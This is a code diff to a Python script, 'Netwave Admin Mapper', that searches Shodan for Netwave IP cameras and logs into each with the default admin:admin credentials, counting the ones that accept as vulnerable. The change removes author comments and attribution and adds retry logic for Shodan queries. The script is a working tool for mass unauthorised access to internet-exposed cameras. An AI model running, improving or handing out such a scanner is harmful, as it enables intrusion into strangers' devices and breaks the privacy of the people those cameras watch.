@@ -1,21 +1,18 @@
-# Script by JoaoVitorBF
-# Do anything you want with it, I don't care
-
 import shodan
 import requests
 import sys
 import argparse
-from multiprocessing import Process, Pool, Queue
+from multiprocessing import Process, Queue
 from random import randrange
 from time import sleep
 
-banner = """
+banner = r"""
       _   ___          __     __  __ 
      | \ | \ \        / /\   |  \/  |
      |  \| |\ \  /\  / /  \  | \  / |
      | . ` | \ \/  \/ / /\ \ | |\/| |
      | |\  |  \  /\  / ____ \| |  | |
-     |_| \_|   \/  \/_/    \_\_|  |_|
+     |_| \_|   \/  \/_/    \_\_|  |_| 
 """
 bannertext = """
           Netwave Admin Mapper
@@ -27,11 +24,10 @@ Created by JoaoVitorBF
 Thanks to:
 achillean == shodan-python
 kennethreitz == requests
-vanpersiexp == the awesome expcamera auto-exploit tool
+vanpersiexp == the awesome
 
 And to all the contributors in those repos!"""
 
-# Send a request to the IP to see if the default admin credentials work
 def process_ip(ip, port, queue):
     try:
         reqa = requests.get("http://{}:{}/check_user.cgi".format(ip, port),
@@ -41,13 +37,11 @@ def process_ip(ip, port, queue):
             auth=requests.auth.HTTPBasicAuth("admin", "admin"),
             timeout=5)
 
-        # Check if authenticated
         if reqa.text[0] == "v" or reqb.text[0] == "v":
             queue.put(ip+":"+port)
         else:
             queue.put("Failed "+ip+":"+port)
 
-    # Exceptions
     except KeyboardInterrupt:
         queue.put("F")
         print("Process interrupted.", file=sys.stderr)
@@ -55,9 +49,30 @@ def process_ip(ip, port, queue):
     except Exception:
         queue.put("F")
 
+def get_shodan_results(api, searchstr, curpage, max_retries=5, retry_delay=5):
+    retries = 0
+    while retries < max_retries:
+        try:
+            results = api.search(searchstr, page=curpage)
+            if 'matches' in results:
+                return results
+            else:
+                print("Shodan returned no matches, retrying...")
+                retries += 1
+                sleep(retry_delay)
+        except shodan.APIError as e:
+            print(f"Shodan API Error: {e}, retrying...")
+            retries += 1
+            sleep(retry_delay)
+        except Exception as e:
+            print(f"Unexpected error: {e}, retrying...")
+            retries += 1
+            sleep(retry_delay)
+    print("Failed to retrieve results after multiple retries. Exiting...")
+    sys.exit(1)
+
 if __name__ == "__main__":
     try:
-        # Arguments
         parser = argparse.ArgumentParser(description=banner, formatter_class=argparse.RawDescriptionHelpFormatter)
         parser.add_argument('key', help="Your Shodan API key")
         parser.add_argument('-q', metavar="options", help="Your Shodan query options (example: \"city:\\\"Chicago\\\"\")")
@@ -77,17 +92,14 @@ if __name__ == "__main__":
             print(about)
             quit()
 
-        # Output files
         if args.o:
             outfile = open(args.o, "a")
         if args.out_failed:
             outfailedfile = open(args.out_failed, "a")
 
-        # NWAM Banner
         if args.silent == False and args.iponly == False:
             print(banner+bannertext+"\n\n")
 
-        # Connect to Shodan and setup the query string
         api = shodan.Shodan(args.key)
         searchstr = "Netwave"
         if args.q:
@@ -95,14 +107,12 @@ if __name__ == "__main__":
             if args.silent == False and args.iponly == False:
                 print("Searching with options: "+args.q)
         
-        # Main loop
         curpage = 1
         while True:
-            results = api.search(searchstr, page=curpage)
+            results = get_shodan_results(api, searchstr, curpage)
             if curpage == 1 and args.silent == False and args.iponly == False:
                 print("Shodan returned {} results!\n".format(results["total"]))
             
-            # Tone down the threads if not enough results
             if args.c > int(results["total"]):
                 threads = int(results["total"])
             else:
@@ -113,22 +123,18 @@ if __name__ == "__main__":
             processed = 0
             vulnerable = 0
 
-            # Check if finished
             if len(results['matches']) == 0 and args.silent == False and args.iponly == False:
                 print("Mapping done! Quitting...")
                 quit()
             elif args.silent == False and args.iponly == False:
                 print("Processing page {}...".format(curpage))
             
-            # Loop through IPs
             for result in results['matches']:
                 if runningcount < threads:
-                    # Spawn processes
                     p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                     p.start()
                     runningcount += 1
                 else:
-                    # Wait for a process to return
                     res = q.get(timeout=6)
                     if res[0] != "F":
                         if args.iponly and args.silent == False: print(res)
@@ -138,11 +144,9 @@ if __name__ == "__main__":
                     elif args.out_failed and res != "F":
                         outfailedfile.write(res.split(" ")[1]+"\n")
                     processed += 1
-                    # Then spawn the new process
                     p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                     p.start()
 
-            # Wait for the remaining processes to return
             while runningcount > 0:
                 res = q.get(timeout=6)
                 if res[0] != "F":
@@ -159,7 +163,6 @@ if __name__ == "__main__":
                 print("Processed {} cameras, {} vulnerable.\n".format(processed, vulnerable))
             curpage += 1
 
-    # Exceptions
     except shodan.APIError as e:
         print(e)
     except KeyboardInterrupt:
